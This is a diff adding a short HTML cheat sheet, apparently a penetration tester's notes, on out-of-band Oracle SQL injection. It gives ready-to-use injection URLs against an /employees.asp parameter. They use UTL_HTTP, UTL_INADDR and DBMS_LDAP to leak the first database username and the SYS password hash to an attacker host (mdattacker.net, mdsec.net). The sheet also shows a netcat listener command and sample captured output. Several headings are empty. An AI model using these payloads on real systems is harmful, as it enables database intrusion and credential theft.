@@ -1,0 +1,25 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Out-of-Band</title>
+</head><body><b>UTL_HTTP</b><br/>
+<br/>
+This URL causes UTL_HTTP to make a GET request for a URL containing the first username in the table all_users. The attacker can simply set up a netcat listener on mdattacker.net to receive the result<br/>
+<br/>
+<tt>/employees.asp?EmpNo=7521'||UTL_HTTP.request('mdattacker.net:80/'||(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--</tt><br/>
+<tt>$ nc -nLp 80<br/>
+</tt><tt>GET /SYS HTTP/1.1</tt><br/>
+<br/>
+<b>UTL_INADDR</b><br/>
+<br/>
+This results in a DNS query to the mdattacker.net name server containing the SYS user’s password hash<br/>
+<br/>
+<tt>/employees.asp?EmpNo=7521'||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%20FROM%20DBA_USERS%20WHERE%20NAME='SYS')||'.mdattacker.net')</tt><br/>
+in attacker DNS server log we get <tt>DCB748A5BC5390F2.mdattacker.net</tt><br/>
+<br/>
+<b>UTL_SMTP<br/>
+</b><b>UTL_TCP</b><br/>
+<br/>
+Oracle 11g unauthenticted query execution bypass<br/>
+<tt>SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE NAME='SYS')||'.mdsec.net',80)<br/>
+</tt></body></html>
